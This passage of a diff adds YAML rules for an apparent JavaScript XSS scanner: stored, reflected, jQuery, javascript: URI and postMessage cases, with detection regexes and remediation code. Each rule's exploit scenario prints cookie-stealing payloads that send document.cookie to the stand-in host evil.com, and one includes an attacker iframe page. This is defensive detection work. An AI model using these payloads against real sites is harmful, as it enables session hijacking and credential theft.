+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [XSS-JS-003, XSS-JS-004]
+
+  # --------------------------------------------------------------------------
+  # XSS-JS-006: Stored XSS via Database Content
+  # --------------------------------------------------------------------------
+  - rule_id: XSS-JS-006
+    title: Stored XSS via Unsanitized Database Content Rendering
+    description: >
+      Detects server-side rendering patterns in Node.js/Express where database
+      content is rendered into HTML templates without proper escaping or sanitization.
+      Stored XSS is the most dangerous XSS variant because it persists across
+      sessions and affects all users viewing the poisoned content.
+    language: javascript
+    category: xss
+    severity: High
+    confidence: 0.88
+    cwe: CWE-79
+    owasp: A03:2021-Injection
+    tags: [xss, stored-xss, database, template, express, javascript]
+    detection_layer: 2
+    attack_surface_type: web
+    patterns:
+      - type: regex
+        pattern: 'res\.send\s*\(\s*[`''"]<.*?\$\{.*?(?:user|data|record|post|comment|message|content)[\.\[].*?\}.*?>'
+        description: "res.send with template literal embedding DB data in HTML"
+      - type: regex
+        pattern: 'res\.send\s*\(\s*[''"]<.*?[''"].*?\+.*?(?:user|data|record|post|comment|message|content)[\.\[]'
+        description: "res.send concatenating HTML with DB data"
+      - type: regex
+        pattern: '(?:ejs|pug|hbs|handlebars|mustache).*?(?:\{?\{\{?\{?\s*)(?:user|data|record|post|comment|message|content)\.\w+(?:\s*\}?\}\}?\}?)'
+        description: "Template rendering unescaped variable from database"
+      - type: regex
+        pattern: '(?:triple-brace|triple_stache|raw|safe|html)\s*(?:\{?\{\{?\{?\s*)(?:user|content|comment|post|message)'
+        description: "Template helper outputting raw/unescaped database content"
+      - type: regex
+        pattern: '\{\{\{.*?(?:content|body|html|bio|description|comment|message).*?\}\}\}'
+        description: "Handlebars triple-mustache (unescaped) with content fields"
+      - type: regex
+        pattern: '(?:!{|!=|!==)\s*(?:user|content|html|body|comment|post)\.'
+        description: "Pug/Jade unescaped output of database content"
+    anti_patterns:
+      - 'escape'
+      - 'sanitize'
+      - 'DOMPurify'
+      - 'xss-filters'
+      - 'encode'
+      - 'he.encode'
+      - 'entities'
+      - '.test.'
+      - '__tests__'
+      - 'spec.'
+      - 'mock'
+      - 'fixture'
+      - 'jest'
+      - 'autoEscaping'
+    bypass_variants:
+      - description: "Template engine with auto-escaping disabled"
+        pattern: 'app\.set\s*\(\s*[''"]view options[''"].*?escape\s*:\s*false'
+      - description: "EJS with unescaped output tag"
+        pattern: '<%[-=]\s*(?:user|content|data|post|comment)\.'
+      - description: "Nunjucks safe filter on user content"
+        pattern: '\|\s*safe\s*\}\}.*?(?:content|html|body|comment|message)'
+    evasion_indicators:
+      - "Template auto-escaping disabled globally"
+      - "Unescaped template output tags"
+      - "Safe/raw filter on user-generated content"
+      - "Database HTML field rendered without sanitization"
+    encoding_variants:
+      - type: "template_literal"
+        pattern: '`<html>.*?\$\{.*?data\.\w+.*?\}.*?</html>`'
+      - type: "handlebars_raw"
+        pattern: '\{\{\{.*?\}\}\}'
+      - type: "ejs_unescaped"
+        pattern: '<%[-]\s*\w+\.\w+\s*%>'
+    multi_function_chain_patterns:
+      - "db.find() -> result.content -> ejs render -> unescaped output"
+      - "Model.findById() -> doc.html -> res.send('<div>' + doc.html)"
+      - "mongodb.findOne() -> data.bio -> handlebars {{{bio}}}"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Stored XSS persists and affects all users viewing content"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "database_record"
+        sink: "html_template"
+        through: "unescaped_output"
+      - source: "mongodb_document"
+        sink: "res_send"
+        through: "string_concatenation"
+      - source: "user_generated_content"
+        sink: "template_render"
+        through: "raw_filter"
+    impact: |
+      Stored XSS from database content affects all viewers:
+      - Self-propagating XSS worms
+      - Mass credential harvesting
+      - Persistent phishing overlays
+      - Cryptocurrency mining across all visitors
+    remediation: |
+      ```javascript
+      // SECURE: Use template engine auto-escaping (default in most)
+      // EJS: Use <%= %> (escaped) instead of <%- %> (raw)
+      // Handlebars: Use {{ }} (escaped) instead of {{{ }}} (raw)
+
+      // For HTML content, sanitize before storage AND rendering
+      const DOMPurify = require('isomorphic-dompurify');
+      const clean = DOMPurify.sanitize(userInput);
+      await db.collection('posts').insertOne({ content: clean });
+      ```
+    references:
+      - "https://cwe.mitre.org/data/definitions/79.html"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+    context_awareness:
+      surrounding_context_patterns: ['render', 'template', 'ejs', 'handlebars', 'res.send']
+      taint_source_indicators: ['findById', 'findOne', 'query', 'db.collection', 'Model.find']
+      taint_sink_indicators: ['res.send', 'res.render', 'innerHTML', '{{{', '<%-']
+      sanitization_patterns: ['DOMPurify', 'sanitize', 'escape', 'encode', 'he.encode']
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (1 + affected_user_count)"
+      exploitability_score: High
+    exploit_scenario:
+      attack_example: |
+        Blog comment stored and rendered without sanitization:
+        1. Attacker submits comment: <script>document.location='https://evil.com/steal?c='+document.cookie</script>
+        2. Comment stored in MongoDB without sanitization
+        3. Every user viewing the blog post executes the script
+      example_payload: "<script>new Image().src='https://evil.com/c='+document.cookie</script>"
+      attacker_objective: "Persist malicious script that executes for all content viewers"
+    confidence_factors:
+      pattern_strength: high
+      context_match: high
+      proximity_to_user_input: high
+      sanitization_absence: high
+    metadata:
+      rule_version: '3.0.0'
+      last_reviewed: '2025-01-15'
+      rule_maturity_level: hardened
+      detection_complexity: contextual
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [XSS-JS-001, XSS-JS-007]
+
+  # --------------------------------------------------------------------------
+  # XSS-JS-007: Reflected XSS via Express Response
+  # --------------------------------------------------------------------------
+  - rule_id: XSS-JS-007
+    title: Reflected XSS via Express Request Parameters
+    description: >
+      Detects reflected XSS patterns in Express.js where request query parameters,
+      URL parameters, headers, or body fields are directly reflected in the HTTP
+      response without encoding. Reflected XSS requires victim interaction (clicking
+      a crafted link) but is still widely exploitable via phishing and social engineering.
+    language: javascript
+    category: xss
+    severity: High
+    confidence: 0.90
+    cwe: CWE-79
+    owasp: A03:2021-Injection
+    tags: [xss, reflected-xss, express, server-side, javascript]
+    detection_layer: 1
+    attack_surface_type: web
+    patterns:
+      - type: regex
+        pattern: 'res\.send\s*\(\s*[`''"].*?(?:req\.query|req\.params|req\.body|req\.headers)\.\w+'
+        description: "res.send reflecting request data in response"
+      - type: regex
+        pattern: 'res\.send\s*\(\s*[''"]<.*?[''"].*?\+.*?req\.(?:query|params|body)\.\w+'
+        description: "res.send concatenating HTML with request parameters"
+      - type: regex
+        pattern: 'res\.(?:write|end)\s*\(\s*[`''"]<.*?(?:req\.query|req\.params|req\.body)'
+        description: "res.write/end reflecting request data"
+      - type: regex
+        pattern: 'res\.send\s*\(\s*`[^`]*\$\{req\.(?:query|params|body)\.\w+\}[^`]*`\s*\)'
+        description: "res.send with template literal including request data"
+      - type: regex
+        pattern: 'res\.json\s*\(\s*\{[^}]*(?:html|message|error)\s*:\s*[`''"]<.*?req\.(?:query|params|body)'
+        description: "JSON response with HTML containing reflected request data"
+      - type: regex
+        pattern: 'res\.status\s*\(\s*\d+\s*\)\.send\s*\(\s*[`''"].*?req\.(?:query|params|body)\.\w+'
+        description: "Error response reflecting request parameters"
+    anti_patterns:
+      - 'escape'
+      - 'sanitize'
+      - 'encode'
+      - 'he.encode'
+      - 'xss-filters'
+      - 'helmet'
+      - 'Content-Type.*json'
+      - '.test.'
+      - '__tests__'
+      - 'spec.'
+      - 'mock'
+      - 'fixture'
+      - 'jest'
+      - 'validator'
+    bypass_variants:
+      - description: "Error handler reflecting user input"
+        pattern: 'app\.use\s*\(\s*\(\s*err.*?\)\s*=>\s*\{[^}]*res\.send.*?(?:req\.url|req\.path|req\.originalUrl)'
+      - description: "404 handler reflecting requested URL"
+        pattern: 'app\.use\s*\(\s*\(\s*req.*?\)\s*=>\s*\{[^}]*(?:404|not\s*found)[^}]*res\.send.*?req\.(?:url|path|originalUrl)'
+      - description: "JSONP callback reflecting parameter"
+        pattern: 'req\.query\.callback\s*\+\s*[''"]\\s*\(\s*[''"]'
+    evasion_indicators:
+      - "Error pages reflecting user input"
+      - "404 handlers including requested URL"
+      - "JSONP endpoints with unvalidated callbacks"
+      - "Search pages reflecting query terms"
+    encoding_variants:
+      - type: "query_reflection"
+        pattern: 'res\.send.*req\.query\.\w+'
+      - type: "url_reflection"
+        pattern: 'res\.send.*req\.(?:url|path|originalUrl)'
+      - type: "header_reflection"
+        pattern: 'res\.send.*req\.headers\.\w+'
+    multi_function_chain_patterns:
+      - "req.query.search -> res.send('<p>Results for: ' + search)"
+      - "req.params.name -> template literal -> res.send(`Hello ${name}`)"
+      - "req.url -> 404 handler -> res.send('Not found: ' + req.url)"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Reflected XSS enables targeted attacks via crafted URLs"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "req.query"
+        sink: "res.send"
+        through: "string_concatenation"
+      - source: "req.params"
+        sink: "res.send"
+        through: "template_literal"
+      - source: "req.url"
+        sink: "error_handler"
+        through: "404_response"
+    impact: |
+      Reflected XSS in Express responses enables:
+      - Targeted phishing via crafted URLs
+      - Session hijacking of specific users
+      - One-click account compromise
+      - Credential theft via fake login forms
+    remediation: |
+      ```javascript
+      const he = require('he');
+
+      // SECURE: Encode user input before reflecting
+      app.get('/search', (req, res) => {
+        const query = he.encode(req.query.q);
+        res.send(`<p>Results for: ${query}</p>`);
+      });
+
+      // BETTER: Use template engine with auto-escaping
+      app.get('/search', (req, res) => {
+        res.render('search', { query: req.query.q }); // Auto-escaped
+      });
+      ```
+    references:
+      - "https://cwe.mitre.org/data/definitions/79.html"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+    context_awareness:
+      surrounding_context_patterns: ['express', 'app.get', 'app.post', 'router', 'res.send']
+      taint_source_indicators: ['req.query', 'req.params', 'req.body', 'req.headers']
+      taint_sink_indicators: ['res.send', 'res.write', 'res.end', 'res.render']
+      sanitization_patterns: ['he.encode', 'escape', 'sanitize', 'xss-filters', 'helmet']
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (1 + reflection_context)"
+      exploitability_score: High
+    exploit_scenario:
+      attack_example: |
+        Express search endpoint reflecting query:
+        res.send('<p>You searched for: ' + req.query.q + '</p>');
+        URL: https://target.com/search?q=<script>document.location='https://evil.com/c='+document.cookie</script>
+      example_payload: "https://target.com/search?q=<script>alert(document.cookie)</script>"
+      attacker_objective: "Inject script via reflected request parameters"
+    confidence_factors:
+      pattern_strength: high
+      context_match: high
+      proximity_to_user_input: high
+      sanitization_absence: high
+    metadata:
+      rule_version: '3.0.0'
+      last_reviewed: '2025-01-15'
+      rule_maturity_level: hardened
+      detection_complexity: contextual
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [XSS-JS-006, XSS-JS-001]
+
+  # --------------------------------------------------------------------------
+  # XSS-JS-008: jQuery HTML Injection
+  # --------------------------------------------------------------------------
+  - rule_id: XSS-JS-008
+    title: jQuery HTML Injection via .html() and Selector Manipulation
+    description: >
+      Detects jQuery XSS sinks including .html() with user input, .append() with
+      unsanitized HTML strings, $(userInput) selector injection, and .attr() on
+      event handler or href attributes with user data. jQuery's HTML manipulation
+      methods parse and execute embedded scripts, making them common XSS vectors.
+    language: javascript
+    category: xss
+    severity: High
+    confidence: 0.90
+    cwe: CWE-79
+    owasp: A03:2021-Injection
+    tags: [xss, jquery, html-injection, selector-injection, javascript]
+    detection_layer: 1
+    attack_surface_type: web
+    patterns:
+      - type: regex
+        pattern: '\$\s*\(\s*[''"]#?\w+[''"].*?\)\.html\s*\(\s*(?:.*(?:param|input|query|user|data|content|response|body|value))[\.\[]'
+        description: "jQuery .html() with user-controlled data"
+      - type: regex
+        pattern: '\$\s*\(\s*[''"]#?\w+[''"].*?\)\.html\s*\(\s*[`''"]<.*?\$\{.*?\}.*?>'
+        description: "jQuery .html() with template literal containing interpolation"
+      - type: regex
+        pattern: '\$\s*\(\s*(?:.*(?:location|document\.URL|window\.name|param|input|query|user|data))'
+        description: "jQuery selector with user-controlled input (selector injection)"
+      - type: regex
+        pattern: '\$\s*\(\s*[''"]#?\w+[''"].*?\)\.(?:append|prepend|after|before)\s*\(\s*[`''"]<.*?(?:param|input|query|user|data)'
+        description: "jQuery DOM insertion with user-controlled HTML"
+      - type: regex
+        pattern: '\$\s*\(\s*[''"]#?\w+[''"].*?\)\.attr\s*\(\s*[''"](?:href|src|action|onload|onclick|onerror)[''"].*?(?:param|input|query|user|data)'
+        description: "jQuery .attr() setting dangerous attribute with user input"
+      - type: regex
+        pattern: '\$\.(?:parseHTML|globalEval)\s*\(\s*(?:.*(?:param|input|query|user|data|response|content))'
+        description: "jQuery parseHTML or globalEval with user-controlled content"
+    anti_patterns:
+      - 'DOMPurify'
+      - 'sanitize'
+      - '.text('
+      - 'escape'
+      - 'encodeHTML'
+      - 'xss-filters'
+      - '.test.'
+      - '__tests__'
+      - 'spec.'
+      - 'mock'
+      - 'fixture'
+      - 'jest'
+      - 'validator'
+      - 'he.encode'
+    bypass_variants:
+      - description: "jQuery .html() via variable containing user data"
+        pattern: '(?:var|let|const)\s+\w+\s*=\s*[''"]<.*?[''"].*?(?:param|input|user|data)[^;]*;[\\s\\S]*?\$\s*\([^)]+\)\.html\s*\(\s*\w+\s*\)'
+      - description: "jQuery AJAX success callback injecting response HTML"
+        pattern: '\$\.(?:ajax|get|post)\s*\([^)]*\)[^}]*\.(?:done|success|then)\s*\([^)]*\{[^}]*\.html\s*\('
+      - description: "jQuery constructor with user input creating elements"
+        pattern: '\$\s*\(\s*[''"]<\w+[''"].*?\+.*?(?:param|input|user|data)'
+    evasion_indicators:
+      - "jQuery .html() called on AJAX response data"
+      - "jQuery selector injection via user input"
+      - "jQuery DOM insertion methods creating HTML from user data"
+      - "jQuery constructor building elements from user input"
+    encoding_variants:
+      - type: "html_method"
+        pattern: '\.html\s*\(\s*(?:data|content|user|response)\.'
+      - type: "selector_injection"
+        pattern: '\$\s*\(\s*(?:user|param|input|data)\.'
+      - type: "append_html"
+        pattern: '\.append\s*\(\s*[''"]<.*?(?:user|data|param)'
+    multi_function_chain_patterns:
+      - "$.get('/api/data') -> .done(data => el.html(data.content))"
+      - "location.hash -> $(hash) -> selector injection"
+      - "$('#output').html('<p>' + userInput + '</p>')"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "jQuery XSS enables script injection in legacy web applications"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "user_input"
+        sink: "jquery_html"
+        through: "string_concatenation"
+      - source: "location_hash"
+        sink: "jquery_selector"
+        through: "direct_pass"
+      - source: "ajax_response"
+        sink: "jquery_append"
+        through: "callback_function"
+    impact: |
+      jQuery HTML injection enables XSS via multiple vectors:
+      - .html() parses and executes script tags
+      - Selector injection leads to DOM manipulation
+      - .attr() on event handlers enables script execution
+      - Legacy jQuery apps often lack CSP protection
+    remediation: |
+      ```javascript
+      // SECURE: Use .text() instead of .html() for text content
+      $('#output').text(userInput);
+
+      // SECURE: Use DOMPurify when HTML rendering is needed
+      import DOMPurify from 'dompurify';
+      $('#output').html(DOMPurify.sanitize(htmlContent));
+
+      // SECURE: Use safe jQuery selector patterns
+      const el = document.getElementById(validId); // Instead of $(userInput)
+      ```
+    references:
+      - "https://cwe.mitre.org/data/definitions/79.html"
+      - "https://api.jquery.com/html/"
+    context_awareness:
+      surrounding_context_patterns: ['jQuery', '$', '.html(', '.append(', '.attr(']
+      taint_source_indicators: ['location.hash', 'location.search', 'URL', 'param']
+      taint_sink_indicators: ['.html(', '.append(', '.prepend(', '.attr(', '.after(', '$(']
+      sanitization_patterns: ['.text(', 'DOMPurify', 'sanitize', 'escape']
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (1 + jquery_usage_prevalence)"
+      exploitability_score: High
+    exploit_scenario:
+      attack_example: |
+        jQuery .html() with URL hash:
+        var content = location.hash.slice(1);
+        $('#results').html(content);
+        URL: https://target.com/page#<img src=x onerror=alert(document.cookie)>
+      example_payload: "<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>"
+      attacker_objective: "Inject HTML/script via jQuery DOM manipulation methods"
+    confidence_factors:
+      pattern_strength: high
+      context_match: high
+      proximity_to_user_input: high
+      sanitization_absence: high
+    metadata:
+      rule_version: '3.0.0'
+      last_reviewed: '2025-01-15'
+      rule_maturity_level: hardened
+      detection_complexity: contextual
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [XSS-JS-001, XSS-JS-002]
+
+  # --------------------------------------------------------------------------
+  # XSS-JS-009: Location Manipulation and JavaScript URI
+  # --------------------------------------------------------------------------
+  - rule_id: XSS-JS-009
+    title: Location Manipulation and javascript URI Injection
+    description: >
+      Detects patterns where user-controlled data is assigned to location properties
+      (window.location, document.location, location.href) or used in anchor href
+      attributes without validation against javascript: URI schemes. JavaScript URIs
+      execute arbitrary script when navigated to and are a common XSS vector in
+      redirect and navigation logic.
+    language: javascript
+    category: xss
+    severity: High
+    confidence: 0.89
+    cwe: CWE-79
+    owasp: A03:2021-Injection
+    tags: [xss, javascript-uri, open-redirect, navigation, javascript]
+    detection_layer: 1
+    attack_surface_type: web
+    patterns:
+      - type: regex
+        pattern: '(?:window\.|document\.)?location(?:\.href)?\s*=\s*(?:req\.query|req\.params|data|user|param|input|searchParams)\.'
+        description: "Location assignment from user-controlled source"
+      - type: regex
+        pattern: '(?:window\.|document\.)?location\.replace\s*\(\s*(?:req\.query|req\.params|data|user|param|input|searchParams)\.'
+        description: "location.replace with user-controlled URL"
+      - type: regex
+        pattern: '\.setAttribute\s*\(\s*[''"]href[''"].*?(?:param|input|query|user|data|url|redirect|next|return|callback)'
+        description: "setAttribute href with user-controlled URL"
+      - type: regex
+        pattern: 'href\s*=\s*\{?\s*(?:props|state|data|user|content|param|input|url)\.\w+'
+        description: "JSX/HTML href from user-controlled variable"
+      - type: regex
+        pattern: '\.href\s*=\s*(?:.*(?:URLSearchParams|searchParams|query|hash|param|redirect|next|return))'
+        description: "href property set from URL parameters"
+      - type: regex
+        pattern: 'window\.open\s*\(\s*(?:.*(?:param|input|query|user|data|url|redirect|next|return))'
+        description: "window.open with user-controlled URL"
+    anti_patterns:
+      - 'javascript:'
+      - 'startsWith.*http'
+      - 'startsWith.*/'
+      - 'URL.*parse'
+      - 'new URL'
+      - 'isValidUrl'
+      - 'sanitizeUrl'
+      - 'allowedDomains'
+      - '.test.'
+      - '__tests__'
+      - 'spec.'
+      - 'mock'
+      - 'fixture'
+      - 'jest'
+    bypass_variants:
+      - description: "javascript: URI with entity encoding"
+        pattern: 'href=.*?(?:&#106;|&#x6A;|\\u006A)avascript'
+      - description: "Case variation of javascript: scheme"
+        pattern: 'href=.*?(?:JavaScript|JAVASCRIPT|jAvAsCrIpT):'
+      - description: "Data URI with script content"
+        pattern: 'href=.*?(?:data:text/html|data:application/javascript)'
+    evasion_indicators:
+      - "javascript: URI with case variations"
+      - "Entity-encoded javascript: scheme"
+      - "data: URI used for script execution"
+      - "vbscript: URI on legacy browsers"
+    encoding_variants:
+      - type: "location_assign"
+        pattern: 'location\s*=\s*(?:user|param|data|query)\.'
+      - type: "href_attribute"
+        pattern: 'href\s*=\s*(?:user|param|data|url)\.'
+      - type: "window_open"
+        pattern: 'window\.open\s*\(\s*(?:user|param|data|url)\.'
+    multi_function_chain_patterns:
+      - "req.query.redirect -> location.href = redirect"
+      - "URLSearchParams.get('url') -> anchor.href = url"
+      - "props.link -> <a href={link}> without validation"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "javascript: URI injection enables XSS via navigation"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "url_parameter"
+        sink: "location.href"
+        through: "redirect_logic"
+      - source: "query_string"
+        sink: "anchor_href"
+        through: "dynamic_link"
+      - source: "user_profile_url"
+        sink: "href_attribute"
+        through: "database_field"
+    impact: |
+      javascript: URI injection and open redirect enable:
+      - XSS via javascript: protocol in href/location
+      - Phishing through open redirect to lookalike domains
+      - Session theft via redirect to attacker-controlled page
+      - OAuth token theft via redirect URI manipulation
+    remediation: |
+      ```javascript
+      // SECURE: Validate URL scheme before redirect
+      function safeRedirect(url) {
+        try {
+          const parsed = new URL(url, window.location.origin);
+          if (!['http:', 'https:'].includes(parsed.protocol)) {
+            throw new Error('Invalid protocol');
+          }
+          // Optionally check against allowed domains
+          window.location.href = parsed.href;
+        } catch {
+          window.location.href = '/';
+        }
+      }
+
+      // React: Use sanitize-url library
+      import { sanitizeUrl } from '@braintree/sanitize-url';
+      <a href={sanitizeUrl(userUrl)}>Link</a>
+      ```
+    references:
+      - "https://cwe.mitre.org/data/definitions/79.html"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html"
+    context_awareness:
+      surrounding_context_patterns: ['location', 'href', 'redirect', 'navigate', 'window.open']
+      taint_source_indicators: ['req.query', 'URLSearchParams', 'location.search', 'route.params']
+      taint_sink_indicators: ['location.href', 'location.replace', 'window.open', 'href=']
+      sanitization_patterns: ['new URL', 'sanitizeUrl', 'startsWith', 'protocol check']
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (1 + redirect_exploitation)"
+      exploitability_score: High
+    exploit_scenario:
+      attack_example: |
+        Open redirect used for javascript URI XSS:
+        const redirect = new URLSearchParams(location.search).get('next');
+        window.location.href = redirect;
+        URL: https://target.com/login?next=javascript:fetch('https://evil.com?c='+document.cookie)
+      example_payload: "javascript:document.location='https://evil.com/steal?c='+document.cookie"
+      attacker_objective: "Inject javascript: URI via navigation/redirect logic"
+    confidence_factors:
+      pattern_strength: high
+      context_match: high
+      proximity_to_user_input: high
+      sanitization_absence: high
+    metadata:
+      rule_version: '3.0.0'
+      last_reviewed: '2025-01-15'
+      rule_maturity_level: hardened
+      detection_complexity: contextual
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [XSS-JS-001, XSS-JS-002]
+
+  # --------------------------------------------------------------------------
+  # XSS-JS-010: postMessage XSS
+  # --------------------------------------------------------------------------
+  - rule_id: XSS-JS-010
+    title: Insecure postMessage Handler Enabling XSS
+    description: >
+      Detects window.addEventListener('message') handlers that process incoming
+      messages without validating the origin and use the message data in dangerous
+      sinks like innerHTML, eval, or document.write. The postMessage API allows
+      cross-origin communication; without origin validation, any page can send
+      malicious data to the handler.
+    language: javascript
+    category: xss
+    severity: High
+    confidence: 0.88
+    cwe: CWE-79
+    owasp: A03:2021-Injection
+    tags: [xss, postMessage, cross-origin, dom-xss, javascript]
+    detection_layer: 2
+    attack_surface_type: web
+    patterns:
+      - type: regex
+        pattern: 'addEventListener\s*\(\s*[''"]message[''"].*?(?:innerHTML|outerHTML)\s*=\s*(?:event|e|msg)\.data'
+        description: "Message handler setting innerHTML from event.data"
+      - type: regex
+        pattern: 'addEventListener\s*\(\s*[''"]message[''"].*?(?:eval|Function)\s*\(\s*(?:event|e|msg)\.data'
+        description: "Message handler eval-ing event.data"
+      - type: regex
+        pattern: 'addEventListener\s*\(\s*[''"]message[''"].*?document\.write\s*\(\s*(?:event|e|msg)\.data'
+        description: "Message handler using document.write with event.data"
+      - type: regex
+        pattern: 'addEventListener\s*\(\s*[''"]message[''"].*?(?!(?:event|e)\.origin).*?(?:innerHTML|eval|document\.write|location)'
+        description: "Message handler without origin check using dangerous sink"
+      - type: regex
+        pattern: 'onmessage\s*=\s*(?:function|\().*?(?:innerHTML|eval|document\.write)\s*(?:=|\()\s*(?:event|e|msg)\.data'
+        description: "onmessage handler with dangerous sink"
+      - type: regex
+        pattern: 'addEventListener\s*\(\s*[''"]message[''"].*?location\.\w+\s*=\s*(?:event|e|msg)\.data'
+        description: "Message handler setting location from event.data"
+    anti_patterns:
+      - 'event.origin'
+      - 'e.origin'
+      - 'msg.origin'
+      - 'origin.*===.*https'
+      - 'allowedOrigins'
+      - 'trustedOrigins'
+      - 'DOMPurify'
+      - 'sanitize'
+      - '.test.'
+      - '__tests__'
+      - 'spec.'
+      - 'mock'
+      - 'fixture'
+      - 'jest'
+    bypass_variants:
+      - description: "Origin check with loose comparison"
+        pattern: 'event\.origin\s*(?:==|\.includes|\.indexOf|\.match)\s*\(\s*[''"].*?[''"]'
+      - description: "Origin check only logging, not blocking"
+        pattern: 'event\.origin[^}]*console\.(?:log|warn)[^}]*innerHTML\s*=\s*event\.data'
+      - description: "postMessage from sandboxed iframe with null origin"
+        pattern: 'event\.origin\s*===?\s*[''"]null[''"].*?(?:innerHTML|eval)'
+    evasion_indicators:
+      - "Origin check with loose string matching"
+      - "Origin check present but not enforced"
+      - "null origin from sandboxed iframes accepted"
+      - "Origin checked against user-controllable value"
+    encoding_variants:
+      - type: "event_listener"
+        pattern: 'addEventListener.*message.*event\.data.*innerHTML'
+      - type: "onmessage"
+        pattern: 'onmessage.*event\.data.*(?:eval|innerHTML)'
+      - type: "structured_clone"
+        pattern: 'event\.data\.\w+.*innerHTML'
+    multi_function_chain_patterns:
+      - "addEventListener('message') -> event.data -> innerHTML"
+      - "onmessage = fn -> e.data.html -> document.write(html)"
+      - "addEventListener('message') -> event.data.script -> eval(script)"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "postMessage XSS enables cross-origin script injection"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "cross_origin_message"
+        sink: "innerHTML"
+        through: "event_data"
+      - source: "iframe_postMessage"
+        sink: "eval"
+        through: "message_handler"
+      - source: "window_message"
+        sink: "location"
+        through: "event_data_url"
+    impact: |
+      Insecure postMessage handlers enable cross-origin XSS:
+      - Any origin can send malicious data to the handler
+      - Script injection via innerHTML or eval
+      - Navigation hijacking via location manipulation
+      - Cross-origin data theft from parent/child windows
+    remediation: |
+      ```javascript
+      // SECURE: Always validate origin and sanitize data
+      window.addEventListener('message', (event) => {
+        // Strict origin check
+        if (event.origin !== 'https://trusted-domain.com') {
+          return;
+        }
+
+        // Validate message structure
+        if (typeof event.data !== 'object' || !event.data.type) {
+          return;
+        }
+
+        // Use safe DOM methods
+        element.textContent = event.data.text;
+        // If HTML needed, sanitize first
+        element.innerHTML = DOMPurify.sanitize(event.data.html);
+      });
+      ```
+    references:
+      - "https://cwe.mitre.org/data/definitions/79.html"
+      - "https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage#security_concerns"
+    context_awareness:
+      surrounding_context_patterns: ['addEventListener', 'message', 'postMessage', 'onmessage']
+      taint_source_indicators: ['event.data', 'e.data', 'msg.data', 'message.data']
+      taint_sink_indicators: ['innerHTML', 'eval', 'document.write', 'location.href']
+      sanitization_patterns: ['event.origin', 'DOMPurify', 'sanitize', 'allowedOrigins']
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (1 + origin_check_absence)"
+      exploitability_score: High
+    exploit_scenario:
+      attack_example: |
+        postMessage handler without origin check:
+        window.addEventListener('message', (e) => { document.getElementById('content').innerHTML = e.data; });
+
+        Attacker page:
+        <iframe src="https://target.com/page"></iframe>
+        <script>frames[0].postMessage('<img src=x onerror=alert(document.cookie)>', '*');</script>
+      example_payload: "<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>"
+      attacker_objective: "Inject script via cross-origin postMessage to unvalidated handler"
+    confidence_factors:
+      pattern_strength: high
+      context_match: high
+      proximity_to_user_input: high
+      sanitization_absence: high
+    metadata:
+      rule_version: '3.0.0'
+      last_reviewed: '2025-01-15'
+      rule_maturity_level: hardened
+      detection_complexity: contextual
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [XSS-JS-001, XSS-JS-006]
